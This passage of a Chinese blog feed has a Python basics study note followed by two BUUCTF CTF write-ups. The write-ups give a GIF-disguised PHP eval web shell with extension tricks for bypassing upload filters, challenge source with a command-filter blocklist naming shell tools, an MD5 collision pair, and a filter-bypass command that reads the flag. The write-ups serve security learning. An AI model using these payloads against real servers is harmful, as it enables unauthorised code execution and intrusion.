<h2 id="多个语句构成代码组"><a href="#多个语句构成代码组" class="headerlink" title="多个语句构成代码组"></a>多个语句构成代码组</h2><p>像if,while,de和class这样的复合语句，首行以关键字开始，以冒号结束<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> expression : </span><br><span class="line">   suite</span><br><span class="line"><span class="keyword">elif</span> expression : </span><br><span class="line">   suite </span><br><span class="line"><span class="keyword">else</span> : </span><br><span class="line">   suite</span><br></pre></td></tr></table></figure></p>
<h2 id="print-输出"><a href="#print-输出" class="headerlink" title="print 输出"></a>print 输出</h2><p>默认换行，不需要换行在变量尾部加上end=””<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="string">"a"</span></span><br><span class="line">y=<span class="string">"b"</span></span><br><span class="line"><span class="comment"># 换行输出</span></span><br><span class="line">print( x )</span><br><span class="line">print( y )</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'---------'</span>)</span><br><span class="line"><span class="comment"># 不换行输出</span></span><br><span class="line">print( x, end=<span class="string">" "</span> )</span><br><span class="line">print( y, end=<span class="string">" "</span> )</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><br>执行结果为：<br><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line">---------</span><br><span class="line">a b</span><br></pre></td></tr></table></figure></p>
<h2 id="import与from…import"><a href="#import与from…import" class="headerlink" title="import与from…import"></a>import与from…import</h2><p>在 python 用 import 或者 from…import 来导入相应的模块<br>将某个模块中的全部函数导入，格式为： from somemodule import *</p>
<p>导入sys模块<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">print(<span class="string">'================Python import mode=========================='</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'命令行参数为:'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sys.argv:</span><br><span class="line">    <span class="keyword">print</span> (i)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'\n python 路径为'</span>,sys.path)</span><br></pre></td></tr></table></figure></p>
<h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><p>Python -h查看帮助</p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>运算符分为算数运算符，比较运算符，赋值运算符，逻辑运算符，位运算符，成员运算符，身份运算符</p>
<h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">以下假设变量a为<span class="number">10</span>，变量b为<span class="number">21</span>:</span><br><span class="line"></span><br><span class="line">+	加 - 两个对象相加	a + b 输出结果 <span class="number">31</span></span><br><span class="line">-	减 - 得到负数或是一个数减去另一个数	a - b 输出结果 <span class="number">-11</span></span><br><span class="line">*	乘 - 两个数相乘或是返回一个被重复若干次的字符串	a * b 输出结果 <span class="number">210</span></span><br><span class="line">/	除 - x 除以 y	b / a 输出结果 <span class="number">2.1</span></span><br><span class="line">%	取模 - 返回除法的余数	b % a 输出结果 <span class="number">1</span></span><br><span class="line">**	幂 - 返回x的y次幂	a**b 为<span class="number">10</span>的<span class="number">21</span>次方</span><br><span class="line"><span class="comment">//	取整除 - 向下取接近除数的整数 9//2=4</span></span><br></pre></td></tr></table></figure>
<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">以下假设变量a为<span class="number">10</span>，变量b为<span class="number">20</span>：</span><br><span class="line"></span><br><span class="line">==	等于 - 比较对象是否相等	<span class="comment">(a == b)</span> 返回 False。</span><br><span class="line">!=	不等于 - 比较两个对象是否不相等	<span class="comment">(a != b)</span> 返回 True。</span><br><span class="line">&gt;	大于 - 返回x是否大于y	<span class="comment">(a &gt; b)</span> 返回 False。</span><br><span class="line">&lt;	小于 - 返回x是否小于y。所有比较运算符返回<span class="number">1</span>表示真，返回<span class="number">0</span>表示假.	<span class="comment">(a &lt; b)</span> 返回 True。</span><br><span class="line">&gt;=	大于等于 - 返回x是否大于等于y。	<span class="comment">(a &gt;= b)</span> 返回 False。</span><br><span class="line">&lt;=	小于等于 - 返回x是否小于等于y。	<span class="comment">(a &lt;= b)</span> 返回 True。</span><br></pre></td></tr></table></figure>
<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">以下假设变量a为<span class="number">10</span>，变量b为<span class="number">20</span>：</span><br><span class="line"></span><br><span class="line">=	简单的赋值运算符	<span class="keyword">c</span> = a + b 将 a + b 的运算结果赋值为 <span class="keyword">c</span></span><br><span class="line">+=	加法赋值运算符	<span class="keyword">c</span> += a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> + a</span><br><span class="line">-=	减法赋值运算符	<span class="keyword">c</span> -= a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> - a</span><br><span class="line">*=	乘法赋值运算符	<span class="keyword">c</span> *= a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> * a</span><br><span class="line">/=	除法赋值运算符	<span class="keyword">c</span> /= a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> / a</span><br><span class="line">%=	取模赋值运算符	<span class="keyword">c</span> %= a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> % a</span><br><span class="line">**=	幂赋值运算符	<span class="keyword">c</span> **= a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> ** a</span><br><span class="line">//=	取整除赋值运算符	<span class="keyword">c</span> //= a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> // a</span><br></pre></td></tr></table></figure>
<h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">&amp;	 按位与运算符：参与运算的两个值,如果两个相应位都为<span class="number">1</span>,则该位的结果为<span class="number">1</span>,否则为<span class="number">0</span>（a &amp; b) 输出结果 <span class="number">12</span></span><br><span class="line">|	 按位或运算符：只要对应的二个二进位有一个为<span class="number">1</span>时，结果位就为<span class="number">1</span>。(a | b) 输出结果 <span class="number">61</span></span><br><span class="line">^	 按位异或运算符：当两对应的二进位相异时，结果为<span class="number">1</span>(a ^ b) 输出结果 <span class="number">49</span></span><br><span class="line">~	 按位取反运算符：对数据的每个二进制位取反,即把<span class="number">1</span>变为<span class="number">0</span>,把<span class="number">0</span>变为<span class="number">1</span>。在一个有符号二进制数的补码形式。</span><br><span class="line">&lt;&lt;	 左移动运算符：运算数的各二进位全部左移若干位，由<span class="string">"&lt;&lt;"</span>右边的数指定移动的位数，高位丢弃，低位补<span class="number">0</span>。a &lt;&lt; <span class="number">2</span> 输出结果 <span class="number">240</span></span><br><span class="line">&gt;&gt;	 右移动运算符：把<span class="string">"&gt;&gt;"</span>左边的运算数的各二进位全部右移若干位，<span class="string">"&gt;&gt;"</span>右边的数指定移动的位数	a &gt;&gt; <span class="number">2</span> 输出结果 <span class="number">15</span></span><br></pre></td></tr></table></figure>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">假设变量</span> <span class="string">a</span> <span class="string">为</span> <span class="number">10</span><span class="string">,</span> <span class="string">b为</span> <span class="attr">20:</span></span><br><span class="line"><span class="string">and</span>	<span class="string">x</span> <span class="string">and</span> <span class="string">y</span>	<span class="string">布尔"与"</span> <span class="bullet">-</span> <span class="string">如果</span> <span class="string">x</span> <span class="string">为</span> <span class="literal">False</span><span class="string">，x</span> <span class="string">and</span> <span class="string">y</span> <span class="string">返回</span> <span class="literal">False</span><span class="string">，否则它返回</span> <span class="string">y</span> <span class="string">的计算值。(a</span> <span class="string">and</span> <span class="string">b)</span> <span class="string">返回</span> <span class="number">20</span><span class="string">。</span></span><br><span class="line"><span class="string">or</span>	<span class="string">x</span> <span class="string">or</span> <span class="string">y</span>	<span class="string">布尔"或"</span> <span class="bullet">-</span> <span class="string">如果</span> <span class="string">x</span> <span class="string">是</span> <span class="literal">True</span><span class="string">，它返回</span> <span class="string">x</span> <span class="string">的值，否则它返回</span> <span class="string">y</span> <span class="string">的计算值。(a</span> <span class="string">or</span> <span class="string">b)</span> <span class="string">返回</span> <span class="number">10</span><span class="string">。</span></span><br><span class="line"><span class="string">not</span>	<span class="string">not</span> <span class="string">x</span>	<span class="string">布尔"非"</span> <span class="bullet">-</span> <span class="string">如果</span> <span class="string">x</span> <span class="string">为</span> <span class="literal">True</span><span class="string">，返回</span> <span class="literal">False</span> <span class="string">。如果</span> <span class="string">x</span> <span class="string">为</span> <span class="literal">False</span><span class="string">，它返回</span> <span class="literal">True</span><span class="string">。</span>	</span><br><span class="line">				<span class="string">not(a</span> <span class="string">and</span> <span class="string">b)</span> <span class="string">返回</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>例如：<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">a = 0</span><br><span class="line">b = 20</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( a <span class="keyword">and</span> b ):</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"1 - 变量 a 和 b 都为 true"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"1 - 变量 a 和 b 有一个不为 true"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( a <span class="keyword">or</span> b ):</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"2 - 变量 a 和 b 都为 true，或其中一个变量为 true"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"2 - 变量 a 和 b 都不为 true"</span>)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">结果为：</span><br><span class="line">1 - 变量 a 和 b 有一个不为 <span class="literal">true</span></span><br><span class="line">2 - 变量 a 和 b 都为 <span class="literal">true</span>，或其中一个变量为 <span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
<h3 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">in</span>	<span class="string">如果在指定的序列中找到值返回</span> <span class="literal">True</span><span class="string">，否则返回</span> <span class="literal">False</span><span class="string">。</span>	<span class="string">x</span> <span class="string">在</span> <span class="string">y</span> <span class="string">序列中</span> <span class="string">,</span> <span class="string">如果</span> <span class="string">x</span> <span class="string">在</span> <span class="string">y</span> <span class="string">序列中返回</span> <span class="literal">True</span><span class="string">。</span></span><br><span class="line"></span><br><span class="line"><span class="string">not</span> <span class="string">in</span>	<span class="string">如果在指定的序列中没有找到值返回</span> <span class="literal">True</span><span class="string">，否则返回</span> <span class="literal">False</span><span class="string">。</span>	<span class="string">x</span> <span class="string">不在</span> <span class="string">y</span> <span class="string">序列中</span> <span class="string">,</span> <span class="string">如果</span> <span class="string">x</span> <span class="string">不在</span> <span class="string">y</span> <span class="string">序列中返回</span> <span class="literal">True</span><span class="string">。</span></span><br></pre></td></tr></table></figure>
<p>例如：<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">a = <span class="number">2</span></span><br><span class="line">b = <span class="number">20</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( a in <span class="built_in">list</span> ):</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">"1 - 变量 a 在给定的列表中 list 中"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">"1 - 变量 a 不在给定的列表中 list 中"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( b <span class="keyword">not</span> in <span class="built_in">list</span> ):</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">"2 - 变量 b 不在给定的列表中 list 中"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">"2 - 变量 b 在给定的列表中 list 中"</span>)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">结果为：</span><br><span class="line"><span class="number">1</span> - 变量 a 在给定的列表中 <span class="built_in">list</span> 中</span><br><span class="line"><span class="number">2</span> - 变量 b 不在给定的列表中 <span class="built_in">list</span> 中</span><br></pre></td></tr></table></figure></p>
<h3 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h3><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="literal">is</span>	<span class="literal">is</span> 是判断两个标识符是不是引用自一个对象	x <span class="literal">is</span> y, 类似<span class="built_in"> id</span>(x) ==<span class="built_in"> id</span>(y) , 如果引用的是同一个对象则返回 True，否则返回 False</span><br><span class="line"></span><br><span class="line"><span class="literal">is</span><span class="built_in"> not</span>	<span class="literal">is</span><span class="built_in"> not</span> 是判断两个标识符是不是引用自不同对象	x <span class="literal">is</span><span class="built_in"> not</span> y ， 类似<span class="built_in"> id</span>(a) !=<span class="built_in"> id</span>(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。</span><br></pre></td></tr></table></figure>
<p>例如：<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">a = 20</span><br><span class="line">b = 30</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( a is b ):</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"1 - a 和 b 有相同的标识"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"1 - a 和 b 没有相同的标识"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( id(a) == id(b) ):</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"2 - a 和 b 有相同的标识"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"2 - a 和 b 没有相同的标识"</span>)</span><br><span class="line">   </span><br><span class="line">结果为：</span><br><span class="line">1 - a 和 b 没有相同的标识</span><br><span class="line">2 - a 和 b 没有相同的标识</span><br></pre></td></tr></table></figure></p>
<h3 id="常用数学函数"><a href="#常用数学函数" class="headerlink" title="常用数学函数"></a>常用数学函数</h3><figure class="highlight gml"><table><tr><td class="code"><pre><span class="line"><span class="built_in">abs</span>(<span class="symbol">x</span>)  返回数字的绝对值 如<span class="built_in">abs</span>(<span class="number">-10</span>) 返回 <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ceil</span>(<span class="symbol">x</span>)  向上取整 如math.<span class="built_in">ceil</span>(<span class="number">4.1</span>) 返回 <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">floor</span>(<span class="symbol">x</span>)  向下取整 如math.<span class="built_in">floor</span>(<span class="number">4.9</span>)返回 <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span>(<span class="symbol">x</span>)  返回e的<span class="symbol">x</span>次幂(ex) 如math.<span class="built_in">exp</span>(<span class="number">1</span>) 返回<span class="number">2.718281828459045</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sqrt</span>(<span class="symbol">x</span>)  求平方根</span><br><span class="line"></span><br><span class="line">acos(<span class="symbol">x</span>)  返回<span class="symbol">x</span>的反余弦弧度值</span><br><span class="line"></span><br><span class="line"><span class="built_in">cos</span>(<span class="symbol">x</span>)  返回<span class="symbol">x</span>的弧度的余弦值</span><br><span class="line"></span><br><span class="line"><span class="built_in">sin</span>,<span class="built_in">tan</span>类似</span><br></pre></td></tr></table></figure>
<h3 id="常用随机数函数"><a href="#常用随机数函数" class="headerlink" title="常用随机数函数"></a>常用随机数函数</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">choice(seq)  从序列元素中随机挑选一个元素 比如random.choice(range(<span class="number">10</span>))，从<span class="number">0</span>到<span class="number">9</span>中随机挑选一个整数</span><br><span class="line"></span><br><span class="line">random() 随机生成一个实数，在范围[<span class="number">0</span>,<span class="number">1</span>)内</span><br><span class="line"></span><br><span class="line">randrange ([start,] stop [,step])  从指定范围内 按指定基数递增的集合中获取一个随机数 基数默认值为 <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="数学常量"><a href="#数学常量" class="headerlink" title="数学常量"></a>数学常量</h3><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="literal">pi</span> 数学常量<span class="literal">pi</span> 圆周率</span><br><span class="line">e  数学常量e 自然常数</span><br></pre></td></tr></table></figure>
<h2 id="周报总结："><a href="#周报总结：" class="headerlink" title="周报总结："></a>周报总结：</h2><p> <strong>1.python语言较为简单，但是也面临着一个新的问题，由于python不需要用<code>;</code>来代表语句结束，<code>{}</code>代表代码块，而是使用TAB和空格来进行区分，所以要严格控制TAB和空格的数量，以便区分每个语句或代码块</strong></p>
<p> <strong>2.<code>if while</code>这些复合语句，不像C或者JAVA一样有{}，需要在if [条件] 之后加<code>:</code>表示代码块的开始</strong></p>
<p> <strong>3.<code>import</code>是导入整个模块，<code>from...import</code>是导入某个模块中的某个函数，第二种更为灵活，可以减少时间复杂度，提高效率和辨识度</strong></p>
<p> <strong>4.输入和输出都较为简单，<code>input</code>和<code>print</code>与python2的区别就是需要加括号而不是空格</strong></p>
<p> <strong>5.字符串可以实现多行代码但是需要用三引号括住</strong></p>
<p> <strong>6.字符串不可更改</strong></p>
<p> <strong>7.python对大小写敏感</strong></p>
<p> <strong>8.反斜杠在python中需要慎用，有可能会造成转义而形成不必要的麻烦</strong></p>
<p> <strong>9.python引入了成员运算符<code>（in 和 not in）</code> 可以更加方便地对数据进行查找</strong></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019 Upload</title>
    <url>/2020/02/17/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="极客大挑战 2019 Upload"></a>极客大挑战 2019 Upload</h1><p>打开题目是个上传，随便上传一个图片 竟然告诉我NOT image<br>所以考虑一下文件类型绕过<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">常用一句话：</span><br><span class="line">GIF89a? </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_REQUEST[shell])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>PHP绕过后缀名检测：<br><figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">php,php3,php4,php5,phtml.pht</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/BUUCTF/极客大挑战2019Upload/0.png" alt="avatar"></p>
<p>上传成功，用蚁剑连接<br>在根目录下得到flag</p>
<p>注意，文件都存在upload目录下</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-安洵杯 2019 easy_web</title>
    <url>/2020/02/17/BUUCTF-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/</url>
    <content><![CDATA[<p>打开之后 看到题目 确实很真实 WEB狗可咋活啊</p>
<p>查看源码也啥都没有，最后可疑的就是URL中img后面的字符串，尝试一下base64<br>最后经过两次base64一个hex得到555.png</p>
<p>尝试一下访问index.php 用它的方法得到：<br><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">TmprMlJUWTBOalUzT<span class="number">0</span>RKRk<span class="number">56</span>QTJPRG<span class="symbol">N3</span></span><br></pre></td></tr></table></figure><br>查看源码，解密一下得到源码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>看这一段：<br><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="built_in">string</span>)$_POST[<span class="string">'a'</span>] !== (<span class="built_in">string</span>)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        echo `$cmd`<span class="comment">;</span></span><br></pre></td></tr></table></figure><br>可以考虑用md5碰撞<br><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">a=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%00</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%55</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span>&amp;b=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%02</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%d5</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span></span><br></pre></td></tr></table></figure></p>
<p>这一段是过滤 过滤的太挺多的：<br><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="symbol">\'</span>|<span class="symbol">\"</span>|<span class="symbol">\`</span>|;|,|<span class="symbol">\*</span>|<span class="symbol">\?</span>|<span class="symbol">\\</span>|<span class="symbol">\\</span><span class="symbol">\\</span>|<span class="symbol">\n</span>|<span class="symbol">\t</span>|<span class="symbol">\r</span>|<span class="symbol">\x</span>A0|<span class="symbol">\&#123;</span>|<span class="symbol">\&#125;</span>|<span class="symbol">\(</span>|<span class="symbol">\)</span>|<span class="symbol">\&amp;</span>[^<span class="symbol">\d</span>]|@|<span class="symbol">\|</span>|<span class="symbol">\\</span>$|<span class="symbol">\[</span>|<span class="symbol">\]</span>|&#123;|&#125;|<span class="symbol">\(</span>|<span class="symbol">\)</span>|-|&lt;|&gt;/i", <span class="keyword">$cmd))</span></span><br></pre></td></tr></table></figure></p>
<p>cmd没有过滤sort，所以可以使用sort%20/flag<br>在看了WP之后，得到知识点：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">以下正则可以过滤\</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cmd=<span class="string">"\\"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $cmd;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (preg_match(<span class="string">"/|\\\\|\?/i"</span>, $cmd)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"1"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (preg_match(<span class="string">"/\\\\/i"</span>, $cmd)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"2"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> 